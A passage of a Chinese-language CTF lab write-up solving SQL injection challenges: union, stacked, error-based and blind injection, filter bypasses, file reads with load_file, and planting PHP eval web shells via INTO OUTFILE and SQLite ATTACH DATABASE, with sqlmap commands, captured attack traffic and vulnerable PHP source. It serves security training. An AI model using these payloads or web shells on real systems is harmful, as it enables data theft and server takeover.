?id=-1' union select 1,2,3,group_concat(column_name),5 from information_schema.columns where table_schema=database()--+
?id=-1' union select 1,2,3,flag,5 from flag --+
```

> 5

### 第四题 堆叠注入

```bash
mysqli_multi_query($con,$sql)
```

堆叠注入就是一堆（多条）sql语句一起执行



```bash
?id=1'
?id=1';SHOW databases --+
?id=1';select flag from flag --+
```



### 第五题 报错注入 updatexml()

```bash
SELECT * FROM users WHERE id=('$id') LIMIT 0,1
```

`updatexml()`函数可以对XML文档进行修改

语法如下:

```bash
updatexml(XML_document, XPath_string, new_value)
```

当 XPath_string 格式出现错误时，mysql会爆出XPath语法错误

但是输出的字符长度有限，可以使用 right 函数获取未显示的部分字符



```bash
?id=1') and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+

?id=1') and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)--+

?id=1') and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='flag'),0x7e),1)--+

?id=1') and updatexml(1,concat(0x7e,(select flag from flag),0x7e),1)--+


?id=1') and updatexml(1,concat(0x7e,(right((select group_concat(flag) from flag),10)),0x7e),1)--+

?id=1') and updatexml(1,concat(0x7e,substring((select group_concat(flag) from flag),1,31),0x7e),1)--+
?id=1') and updatexml(1,concat(0x7e,substring((select group_concat(flag) from flag),32,31),0x7e),1)--+
```

### 第六题 报错注入 extractvalue()

```bash
SELECT * FROM users WHERE id=('$id') LIMIT 0,1
```

> you cannot use union,order by,=

`extractvalue()`函数可以对XML文档进行查询

语法如下:

```bash
extractvalue(XML_document, XPath_string)
```

当 XPath_string 格式出现错误时，mysql会爆出XPath语法错误

但是输出的字符长度有限，可以使用 right 函数获取未显示的部分字符



```bash
?id=1') and extractvalue(1,concat(0x7e,database(),0x7e))--+

?id=1') and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e))--+

?id=1') and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name like 'flag'),0x7e))--+


?id=1') and extractvalue(1,concat(0x7e,substring((select group_concat(flag) from flag),1,31),0x7e))--+
?id=1') and extractvalue(1,concat(0x7e,substring((select group_concat(flag) from flag),32,31),0x7e))--+
```

### 第七题 堆叠注入

```bash
mysqli_multi_query($con,$sql)
```



```bash
?id=1'
?id=1';SHOW databases --+
?id=1';select flag from flag --+
```

### 第八题 POST型

```bash
/login.php

name=1&pwd=1
```



```bash
name=guest'&pwd=

name=guest'#&pwd=1
name=admin'#&pwd=1
```

### 第九题 Usagen-Agent

```bash
insert into user_agent(name, agent) values('$name', '$useragent')
```



```bash
guest/123456
```

出现Usagen-Agent

Usagen-Agent是客户请求时携带的请求头,该头部是客户端可控,如果有带入数据库的相关操作,则可能会产生SQL注入问题

```bash
/welcom.php

name=guest&pwd=123456
```



```bash
1',updatexml(1,concat(0x3a,database(),0x3a),1))#
1',updatexml(1,concat(0x3a,(select group_concat(table_name) from information_schema.tables where table_schema =database()),0x3a),1))#
1',updatexml(1,concat(0x3a,(select group_concat(column_name) from information_schema.columns where table_name='users'),0x3a),1))#

1',updatexml(1,concat(0x3a,(select group_concat(name) from users),0x3a),1))#

1', updatexml(1,concat(0x7e,substring((select group_concat(password) from users where
name='fIag'),1,31),0x7e),1))#
1', updatexml(1,concat(0x7e,substring((select group_concat(password) from users where
name='fIag'),32,31),0x7e),1))#
```

> user_agent,users
>
> id,name,password
>
> guest,user,test,fIag,admin

### 第十题 MD5

```bash
if ($row['password'] === md5($_POST['pwd'])) {

        echo 'Welcome!<br>'.$flag;

}
```

输入的密码经过md5加密后与查询的密码进行强比较，相同才能获取flag

```bash
guest/123456 #You are not our user!

更改用户名为admin 后展示的页面	#Wrong password!
• 说明存在 admin 用户，但不知道md5加密前的密码
• 此时可以使用union select 进行伪造

会回显报错信息，由此 name=a' order by 3#&pwd=123，确定列数是 3
使用 name=a' union select 1,'admin',md5('123')#&pwd=123，页面回显如下
```

会回显报错信息

```bash
name=a' order by 3#&pwd=123
```

确定列数是 3

```bash
name=a' union select 1,'admin',md5('123')#&pwd=123
```

尝试后发现 union select 放到了黑名单里，此处可以使用 `union/**/select` 绕过

```bash
name=a' union/**/select 1,'admin',md5('123')#&pwd=123
```

成功登录，获得flag

• 因为 name=a 查询结果为空

• 所以 union 查询的结果就是最终使用的结果

因为是 md5 强比较，也可以使用数组，**数组的md5为NULL**

```bash
    name=a' union/**/select 1,'admin',NULL#&pwd[]=123
```



### 第十一题 文件读取

`load_file()`：读取文件并返回文件内容为字符串，使用此函数必须指定完整路径的文件，必须有FILE权限

> 这个信息只能在本地查看哦！

在请求头添加 

```bash
X-Forwarded-For: 127.0.0.1
```



```bash
/hero.php?id=1
```

> <!-- <div>你要找的信息就在flag.php中</div> -->

```bash
/hero.php?id=1'

id=-1 union select1,2,3,4
```

查看列数和回显的列

一共4列,回显第3，4列内容

利用 `load_file` 读取 flag.php文件

```bash
?id=-1 union select 1,2,load_file("/var/www/html/flag.php"),4--+
```



#### SQL 中的注释符号如下

- 单行使用 ‘`--` ’，注意使用时最后需要加空格，如`--` 注释内容

- 多行使用 ‘`/**/’`，如 `/* 注释内容 */`，使用MySQL数据库`/*!SQL语句 */`会执行SQL语句，

  如`/*!SELECT id,name FROM users*/`; 查询users表中id和name列

- Mysql 也使用‘`#`’，如`SELECT * FROM users WHERE id=1 #`注释

#### load_file(file_path)

- 读取文件内容并输出为字符串
- 其中 file_path 为文件绝对路径，用户必须有 FILE 权限
-  `SELECT load_file(‘/var/www/html/index.php’);`

## 无错误回显

### 第一题 登录

> 小明利用截取的流量成功登入了对方系统，你能找到并成功登录吗？

```bash
POST /login/index.php HTTP/1.1
Host: 192.168.81.140:8088
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Connection: keep-alive
Content-Length: 150
Content-Type: application/x-www-form-urlencoded

username=test%27+and+ascii%28substr%28%28select+group_concat%28password%29+from+users+where+name%3D%27Admin%27%29%2C8%2C1%29%29%3C50+%23&password=test
```

### 第二题 布尔盲注 数据库名

> 这有一段黑客攻击的流量，你能找到黑客获取的数据库名吗？

```bash
GET /less2/index.php?id=1%27%20AND%20ORD%28MID%28%28IFNULL%28CAST%28DATABASE%28%29%20AS%20NCHAR%29%2C0x20%29%29%2C7%2C1%29%29%3E96%20AND%20%27bIbg%27%3D%27bIbg HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.8.6.3#dev (https://sqlmap.org)
Host: 192.168.81.140:8088
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close
```



```bash
1' AND ORD(MID((IFNULL(CAST(DATABASE() AS NCHAR),0x20)),7,1))>96 AND 'bIbg'='bIbg
```

二分法

```bash
104 106 107 108		
TRUE TRUE TRUE FALSE
107

120 121 122 124
TRUE FALSE FALSE FALSE
120
```



### 第三题 表名

> 黑客攻击的流量很大，小明紧急封禁，分析流量后发现没有数据被窃取，你知道黑客想要获取哪个表的数据吗

```bash
GET /less3/index.php?id=1%27%20AND%20%28SELECT%209177%20FROM%20%28SELECT%28SLEEP%284-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28table_name%20AS%20NCHAR%29%2C0x20%29%20FROM%20INFORMATION_SCHEMA.TABLES%20WHERE%20table_schema%3D0x6c796c6162%20LIMIT%201%2C1%29%2C7%2C1%29%29%3E87%2C0%2C4%29%29%29%29%29YNLV%29%20AND%20%27bYbd%27%3D%27bYbd HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.8.6.3#dev (https://sqlmap.org)
Host: 192.168.81.140:8088
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

```

```bash
1' AND (SELECT 9177 FROM (SELECT(SLEEP(4-(IF(ORD(MID((SELECT IFNULL(CAST(table_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=0x6c796c6162 LIMIT 1,1),7,1))>87,0,4)))))YNLV) AND 'bYbd'='bYbd
```

```bash
0x6c796c6162
lylab
```



```bash
GET /less3/index.php?id=1%27%20AND%20%28SELECT%208637%20FROM%20%28SELECT%28SLEEP%284-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28column_name%20AS%20NCHAR%29%2C0x20%29%20FROM%20INFORMATION_SCHEMA.COLUMNS%20WHERE%20table_name%3D0x7a796b685f316e666f%20AND%20table_schema%3D0x6c796c6162%20LIMIT%203%2C1%29%2C4%2C1%29%29%3E104%2C0%2C4%29%29%29%29%29Grbq%29%20AND%20%27ZPTf%27%3D%27ZPTf HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.8.6.3#dev (https://sqlmap.org)
Host: 192.168.81.140:8088
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

```

```bash
1' AND (SELECT 8637 FROM (SELECT(SLEEP(4-(IF(ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x7a796b685f316e666f AND table_schema=0x6c796c6162 LIMIT 3,1),4,1))>104,0,4)))))Grbq) AND 'ZPTf'='ZPTf
```

```bash
0x7a796b685f316e666f
zykh_1nfo
```

### 第四题 文件包含

> 黑客手法层出不穷，小明防不胜防，又被窃取了一个文件的内容

```bash
GET /tmpbszhe.php?cmd=cat%20flag HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.8.6.3#dev (https://sqlmap.org)
Host: 10.223.21.5:30982
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close


HTTP/1.1 200 OK
Date: Wed, 23 Oct 2024 07:35:59 GMT
Server: Apache/2.4.7 (Ubuntu)
X-Powered-By: PHP/5.5.9-1ubuntu4.13
Content-Length: 43
Connection: close
Content-Type: text/html

<pre>185fc38db5d81dc64eafc0df61180d1a</pre>
```



### 第五题 布尔盲注

> sqlmap工具查找

```bash
http://10.223.21.5:32545/?id=1
```



```bash
python sqlmap.py -u http://10.223.21.5:32545/?id=1 --level 1 --risk 1 --dbs --batch --purge --technique=B --dbms= MemSQL

python sqlmap.py -u http://10.223.21.5:32545/?id=1 --level 1 --risk 1 --dump-all --batch --purge -D ly_netlab --technique=B --dbms= MemSQL
```

```bash
Payload: id=1' AND 7049=7049 AND 'hwtV'='hwtV

可用数据库 [4]:
[*] information_schema
[*] ly_netlab
[*] mysql
[*] performance_schema

Database: ly_netlab
Table: flag
[1 entry]
+----+----------------------------------+
| id | flag                             |
+----+----------------------------------+
| 1  | cda1b8b6156260c4f14c3a7616e4c828 |
+----+----------------------------------+
```

> cda1b8b6156260c4f14c3a7616e4c828

### 第六题

```bash
$sql = "SELECT * FROM users WHERE id='$id' LIMIT 0,1"
```

```bash
http://10.223.21.5:31840/?id=1
```



```bash
python sqlmap.py -u http://10.223.21.5:31840/?id=1 --level 1 --risk 1 --dump-all --batch --purge -D ly_netlab --technique=B --dbms= MemSQL


Database: ly_netlab
Table: flag
[1 entry]
+----+----------------------------------+
| id | flag                             |
+----+----------------------------------+
| 1  | cda1b8b6156260c4f14c3a7616e4c828 |
+----+----------------------------------+
```

> Payload: id=1' AND 7197=7197 AND 'qQUy'='qQUy
>
> ly_netlab

### 第七题 过滤and

> 加了一些限制，要怎么绕过呢？

```bash
preg_replace('/and/i', "",$id);
```

and被替换为空

可以尝试换一个运算符

> and --> &&

```bash
http://10.223.21.4:30748/?id=1
```



```bash
GET /?id=1 HTTP/1.1
Host: 10.223.21.4:30748
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: keep-alive
```

延时注入

```bash
' and (select 1 from (select(sleep(2-(if((1=1), 0, 2)))))test)#
```



### 第八题 过滤or

```bash
preg_replace('/or/i', "", $id);
```

过滤了 or，且大小写不敏感

双写or

### 第九题 空格

```bash
preg_replace("/\s+/", "", $id)
```

过滤了空格

### 第十题 

```bash
$id = preg_replace("/\s+/", "", $id);
$id = preg_replace("/#/", "", $id);
$id = preg_replace("/--/", "", $id);
$id = preg_replace("/\/\*\*\//", "", $id);
```

> 过滤了空格和注释-- 、#、/**/

### 第十一题 文件上传

```bash
$id= preg_replace('/substr/i',"", $id);
$id= preg_replace('/left/i',"", $id);
$id= preg_replace('/right/i',"", $id);
$id= preg_replace('/sleep/i',"", $id);
$id= preg_replace('/information/i',"", $id);
```

不能通过information_schema获取数据库的数据

#### 上传webshell

php文件一般都写入到了/var/www/html目录下

使用 `select into` 尝试将文件写入到 /var/www/html下

```bash
?id=1' union select 1,2,3,'<?php @eval($_POST["xxx"]);?>' into outfile "/var/www/html/xxx.php" --+
```

#### 蚁剑连接

```bash
http://10.223.21.5:30680/xxx.php
xxx
```

#### 源码分析

```bash
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
    "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" lang="en">
<head>
    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
    <title>銮舆工控网络安全实验室</title>
    <link rel="stylesheet" href="css/index.css">
</head>
<body>
<div class="wrap">

    <div class="content">
        <div class="choose">
            <div class="chooseContent">
                请选择英雄查看羁绊👉&nbsp;
                <select id="heroSelector" onchange="changeContent()">
                    <option value="1">伊泽瑞尔</option>
                    <option value="2">奈德丽</option>
                    <option value="3">瑟提</option>
                    <option value="4">诺姆希</option>
                    <option value="5">瑟庄妮</option>
                    <option value="6" style="display: none"></option>
                </select>
            </div>
        </div>
        <div class="mainContent">
            <div class="img">
                <?php
                $dbuser = 'root';
                $dbpass = '';
                $dbname = "ly_netlab";
                $host = 'localhost';

                @error_reporting(0);
                $con = mysqli_connect($host, $dbuser, $dbpass);
                // Check connection
                if (!$con) {
                    echo "Failed to connect to MySQL: " . mysql_error();
                }
                //                mysql_query($con,"SET NAMES UTF8");
                //                mysql_query("set character_set_client=utf8");
                //                mysql_query("set character_set_results=utf8");
                @mysqli_select_db( $con,$dbname) or die ("Unable to connect to the database: $dbname");
                //                mysqli_set_charset($con,"utf8");
                mysqli_query($con, "set names utf8");
                @error_reporting(0);

                function blacklist($id)
                {
                    // //Strip out spaces.
                    // $id= preg_replace('/select/m',"", $id);
                    // //Strip out spaces.
                    // $id= preg_replace('/[ +]/',"", $id);
                    // //Strip out select
                    // $id= preg_replace('/select/s',"", $id);
                    // //Strip out SELECT
                    // $id= preg_replace('/SELECT/s',"", $id);

                    $id= preg_replace('/substr/i',"", $id);
                    $id= preg_replace('/left/i',"", $id);
                    $id= preg_replace('/right/i',"", $id);
                    $id= preg_replace('/sleep/i',"", $id);
                    $id= preg_replace('/information/i',"", $id);

                    return $id;
                }

                // take the variables
                if (isset($_GET['id'])) {
                    $id = $_GET['id'];
                    //logging the connection parameters to a file for analysis.
                    $fp = fopen('result.txt', 'a');
                    fwrite($fp, 'ID:' . $id . "\n");
                    fclose($fp);
                    // connectivity
                    // $id= blacklist($id);
                    $sql = "SELECT * FROM users WHERE id='$id' LIMIT 0,1";
                    $result = mysqli_query($con,$sql);
                    $row = @mysqli_fetch_array($result);
                    if ($row) {
                        echo '<img src="images/exist.jpg" id="heroImg" class="tx">';
                        echo '</div>';
                        echo '<div class="desc">';
                        echo '<img src="images/exist.png" style="margin-left:5px;"/>';
                        echo '<br>开心的<br>萌提莫';
                        echo '</div>';
                    } else {
                        echo '<img src="images/no_result.jpg" id="heroImg" class="tx">';
                        echo '</div>';
                        echo '<div class="desc">';
                        echo '<img src="images/no_result.png" style="margin-left:5px;"/>';
                        echo '<br>哭泣的<br>阿木木';
                        echo '</div></div>';
                        echo '<div class="error">';
                        echo '<div class="errorContent" id="errorContent">';
                        // print_r(mysqli_error($con));
                        echo '</div></div>';
                    }
                } else {
                    header("Location:" . $_SERVER["REQUEST_URI"] . "?id=1");
                }
                ?>
            </div>
        </div>
    </div>


    <script type="text/javascript">
        function changeContent() {
            const selectedHero = document.getElementById("heroSelector");
            window.location.href = window.location.href.split("?")[0] + "?id=" + (selectedHero.selectedIndex + 1);
        }

        (function () {
            let searchId = parseInt(window.location.search.split("=")[1]) - 1;
            searchId = searchId > 4 ? 5 : searchId;
            document.getElementById("heroSelector").options[searchId].selected = true;
        })();
    </script>
</body>
</html>

```



### 第十二题

> 小明这次间接把 information 放入了黑名单，还怎么找到 flag 呢？

```bash
$blacklist = array("and","or","having","insert","order","join","left","right","substr","if","sleep","updatexml","extractvalue",'+', '|', '&', "#", "--", ";")

...

select * from xxx where id=$id limit 0,1
```



禁用了大部分函数

打开页面后根据页面内容可知注入点是

参数 id，且是数字型注入

id=6 显示不止有一个表



异或

此时不能直接获取flag表中的字段名称，可使用union select进行无列名注入

• 使用 union 的前提是两个表的字段数量一致，很明显 flag 表和 hero表的字段数量不一样，那么就进行SQL盲注

• 因为是整型注入，可使用异或(`^`)代替`and`和`or`，mid函数用于截取字符串

• 当SQL语句有错误时，重定向到 ?id=2

• 当SQL查询为false时，页面显示为空

• 由此确定flag的列数

```bash
2^2^(mid((select group_concat(a) from (select 1,2 as a union select * from flag)n),1,1)='2')
 
• 2^2=0，0异或任何值都等于本来的值，如0^1=1
• 如果查询成功，那么结果是 id=1，


select group_concat(a) from (select 1,2 as a union select * from flag)n
• (select 1,2 as a union select * from flag)n
• 联合查询并将第2列命名为 a
• 结果命名为n，等价于(select 1,2 as a union select * from flag) as n
• select group_concat(a) from ···
• 将表中列名为 a 的值输出到一个字符串中
```

当 MySQL 版本高于5.6且不能使用`information_schema`时，可以通过`mysql.innodb_table_stats` 表和 `sys` 数据库获取表名

使用 union select 进行无列名注入主要是通过子查询实现，注意union查询的两个表的列数一定一样

### 第十三题 文件读取

load_file()

```bash
?id=-1 union select 1,2,load_file("/var/www/html/flag.php"),4--+
```



### 第十四题 SQLite

> 不同数据库使用的函数不完全一样

#### SQLite

SQLite 没有 if 和 sleep 函数

`SQLite::exec` 主要用于执行 SQLite 数据库中的 SQL 语句，如 `INSERT、UPDATE、DELETE` 等，不返回结果集

```bash
• SQLite 的 ATTACH DATABASE 语句是用来选择一个特定的附加数据库
• 使用：ATTACH DATABASE file_name AS database_name;
• 打开的数据库必须和ATTACH 附加的数据库处于同一目录
• 如果数据库不存在，将会被创建
• 如果使用的数据库设置在WEB目录下，就容易通过ATTACH上传webshell

如查询表名 name=XX' union select 1,name from sqlite_master where type='table' --
• type='table'：类型是表的名称
获取表创建的SQL语句：name=XX'union select group_concat(sql),2 from sqlite_master WHERE type='table' and name='table_name' --

• SQLite 的 ATTACH DATABASE 语句是用来选择一个特定的附加数据库
• 使用：ATTACH DATABASE file_name AS database_name;
• 打开的数据库必须和ATTACH 附加的数据库处于同一目录
• 如果数据库不存在，将会被创建
• 如果使用的数据库设置在WEB目录下，就容易通过ATTACH上传webshell

```



首先注册后登录

在登录页面进行SQL注入测试，发现存在大量被禁用的函数

• 根据提示消息可推测**注册时**使用了`SQLite::exec()`

• 该函数会存在**堆叠注入**，但是不能使用 select

```bash
利用SQLite的ATTACH DATABASE
尝试创建 shell.php 文件并写入内容

http://10.223.21.4:32516/register.php

username=3&password=3');attach database '/var/www/html/info.php' as shell;create table shell.exp (webshell text);insert into shell.exp (webshell) values ('\n<?php echo phpinfo(); ?>\n')--

username=4&password=4');attach database '/var/www/html/shell.php' as shell;create table shell.exp (webshell text);insert into shell.exp (webshell) values ('\n<?php @eval($_POST["xxx"]);?>\n')--
```

#### 蚁剑连接

```bash
http://10.223.21.4:32516/shell.php
xxx

cat /flag
```

#### 源码分析

```bash
<!DOCTYPE html
    PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" lang="en">

<head>
    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
    <link rel="stylesheet" type="text/css" href="./css/register.css">
    <title>銮舆工控网络安全实验室</title>

</head>

<body>
    <div class="main">
        <form action="" method="post" class='login-form'>
            <h2>注册</h2>
            <input type="text" name="username" value="" placeholder='用户名' /><br>
            <input type="password" name="password" value="" placeholder='密码' /><br>
            <button>提交</button>
        </form>
    </div>

    <?php
    if (isset($_POST['username']) && isset($_POST['password'])) {
        $username = $_POST['username'];
        $password = $_POST['password'];
        if ($username == '' || $password == '') {
            echo '<script>alert("请输入用户名和密码")</script>';
            die();
        }
        $blacklist = '/or|regexp|updatexml|extractvalue|select|[|&^]/i';
        if (preg_match($blacklist, $username . $password)) {
            echo '<script>alert("forbidden word");</script>';
            die();
        }
        //连接数据库，SQLite的文件名是 init.db
        $db = new SQLite3('init.db');
        if (!$db) {
            // echo $db->lastErrorMsg();
            die();
        }

        // 查询用户名是否被使用
        $sqls = "SELECT * FROM users where username='" . $username . "'";
        // echo $sqls . "<br>";
        $resultsq = $db->query($sqls);
        $row1 = $resultsq->fetchArray(SQLITE3_ASSOC);
        if ($row1) {
            if ($row1["username"] == $username) {
                echo '<script>alert("用户已被注册")</script>';
                die();
            }else{
                die();
            }
        }
        // 插入
        $sql = "INSERT INTO users(username, password) VALUES ('" . $username . "','" . $password . "')";
        // echo $sql . "<br>";
        $results = $db->exec($sql);
        if (!$results) {
            // echo $db->lastErrorMsg();
            die();
        }
        echo '<h2>注册成功</h2>用户名: ' . $username . '<br>密码:   ' . $password;
        $db->close();
    }
    ?>

</body>

</html>
```

